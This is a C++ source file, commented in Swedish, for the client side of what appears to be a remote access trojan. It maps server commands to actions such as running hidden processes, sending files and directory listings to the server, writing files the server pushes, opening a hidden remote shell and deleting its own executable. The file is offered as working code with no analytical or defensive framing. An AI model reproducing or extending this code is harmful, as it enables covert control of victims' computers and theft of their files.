#pragma once
#include "precompile.h"
#include "client.h"
#include "shell_process.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"process-v", payload::process_execution_show}, // för att starta en process
		{"process-h", payload::process_execution_hidden}, // för att starta en gömd process
		{"download", payload::download_file} // för att över föra en fil till servern
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }}, // för att stänga ner klienten
		{"uninstall", [&](std::string) { // för att avinstallera klienten
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},
		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
			directory manager(data); //antag data är bas directory
			helper::send_directory(client_implentation, manager.current_directory()); // skicka bas mappen

			packet paket = client_implentation.receive_packet(); // ta emot respons
			while (paket.id != "dir_action" && paket.data != "done") { // medans server inte är klar, klienten kommer aldrig att fastna i den här loppen eftersom att den kallar recv vilket gör att den kan ominitializera instansen
				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte är tomt
					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska gå in i en undermapp
						helper::send_directory(client_implentation, manager.descend(std::stoi(paket.data))); // gå in och skicka undermappen
					}
				}
				paket = client_implentation.receive_packet(); // ta emot nästa instruktion från servern
			}
		}},
		{"upload", [&](std::string data) {
			auto [file, folder] = helper::ArgSplit(data, '|');
			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // öppna en filen som ska motas

			if (output.good()) { // om det går att öppna filen på den platsen
				client_implentation.send({ "upload_status", "Ok" });
			}
			else { // annars går det inte att öppna pga kanske fel ägare av mappen eller skrivrättigheter
				client_implentation.send({ "upload_status", ":<" });
				return;
			}

			packet file_data = client_implentation.receive_packet(); // ta emot filen

			output << file_data.data; // skriv filen

			output.close(); // stäng filen
			
		}},
		{"shell-init", [&](std::string data)
		{
			auto [shell, cwd] = helper::ArgSplit(data, '|');

			properties prop{
				shell,
				cwd,
				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
				SW_HIDE,
				false
			};

			shell_process process(prop);
		}}
	};
}